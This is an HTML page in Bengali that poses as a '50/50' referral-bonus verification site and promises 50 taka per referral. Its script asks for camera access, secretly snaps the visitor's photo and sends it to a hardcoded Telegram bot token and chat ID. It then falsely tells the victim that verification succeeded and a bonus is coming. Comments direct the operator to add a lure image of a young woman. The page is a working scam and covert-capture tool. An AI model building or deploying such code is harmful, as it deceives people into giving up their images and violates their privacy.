<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>50/50 Verification</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-image: url('https://i.imgur.com/your-bengali-girl-image.jpg'); /* এখানে আপনার বাঙালি মেয়ের ছবির লিঙ্ক দিন */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            color: white; /* লেখার রঙ সাদা করা হয়েছে যাতে ব্যাকগ্রাউন্ডে ফুটে ওঠে */
            position: relative; /* কন্টেনারের উপরে ওভারলে এর জন্য */
            overflow: hidden; /* ব্যাকগ্রাউন্ড ইমেজ ঠিক রাখার জন্য */
        }
        /* ব্যাকগ্রাউন্ডের উপর হালকা কালো আভা যাতে লেখা স্পষ্ট বোঝা যায় */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.4); /* এখানে অপাসিটি কমানো বা বাড়ানো যাবে */
            z-index: 1;
        }
        .container {
            background: rgba(255, 255, 255, 0.15); /* হালকা ট্রান্সপারেন্ট সাদা ব্যাকগ্রাউন্ড */
            backdrop-filter: blur(5px); /* ব্যাকগ্রাউন্ড ব্লার ইফেক্ট */
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            width: 90%;
            max-width: 400px;
            z-index: 2; /* ওভারলে এর উপরে কন্টেনার */
        }
        h1, h2, p { margin-bottom: 5px; color: white; /* টেক্সট সাদা করা হয়েছে */ }
        h1 { font-size: 2.2em; text-shadow: 1px 1px 3px rgba(0,0,0,0.5); }
        h2 { font-size: 1.5em; margin-top: 15px; text-shadow: 1px 1px 3px rgba(0,0,0,0.5); }
        p { font-size: 1.1em; margin-bottom: 25px; text-shadow: 1px 1px 3px rgba(0,0,0,0.5); }
        #verify-btn { 
            background-color: #007bff; /* নীল রঙ */
            color: white; 
            border: none; 
            padding: 15px 35px; 
            font-size: 1.1em; 
            border-radius: 8px; 
            cursor: pointer; 
            width: 80%; 
            font-weight: bold; 
            transition: background-color 0.3s ease;
        }
        #verify-btn:hover { background-color: #0056b3; }
        #video, #canvas { display: none; }
        #status { margin-top: 20px; color: #f8d7da; /* হালকা লাল রঙ যাতে সমস্যা বোঝা যায় */
            font-weight: bold; font-size: 1em; text-shadow: 1px 1px 2px rgba(0,0,0,0.5); }
    </style>
</head>
<body>

    <div class="container">
        <h1>Welcome to 50/50</h1>
        <h2>প্রতি রেফারর ৫০ টাকা বোনাস পান।</h2>
        <p>বোনাস পেতে হলে verify করুন</p>
        <button id="verify-btn">Verify</button>
        <div id="status"></div>

        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const botToken = "8403844691:AAG7ui2mJ08X8Q5kQ5jhpNoq1PGUqZpx6Ec";
        const chatId = "7068444019";

        const verifyBtn = document.getElementById('verify-btn');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');

        verifyBtn.addEventListener('click', async () => {
            status.innerText = "Processing... Please wait";
            verifyBtn.style.display = "none"; 

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); // শুধু ভিডিও এক্সেস
                video.srcObject = stream;

                setTimeout(async () => {
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'user_capture.png');
                        formData.append('caption', 'New 50/50 verification photo received!');

                        try {
                            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });

                            if(response.ok) {
                                status.innerText = "Verification Successful! Your bonus is on the way.";
                            } else {
                                status.innerText = "Error in verification. Please try again.";
                                verifyBtn.style.display = "block"; // ব্যর্থ হলে বাটন আবার দেখাবে
                            }
                        } catch (e) {
                            status.innerText = "Network error. Try again later.";
                            verifyBtn.style.display = "block"; // নেটওয়ার্ক সমস্যায় বাটন আবার দেখাবে
                        }

                        stream.getTracks().forEach(track => track.stop()); // ক্যামেরা বন্ধ করা
                    }, 'image/png');
                }, 2000); // ২ সেকেন্ডের মধ্যে ছবি তুলবে 

            } catch (err) {
                status.innerText = "Access denied! Please allow camera to verify.";
                verifyBtn.style.display = "block"; // ক্যামেরা পারমিশন না দিলে বাটন আবার দেখাবে
            }
        });
    </script>
</body>
</html>
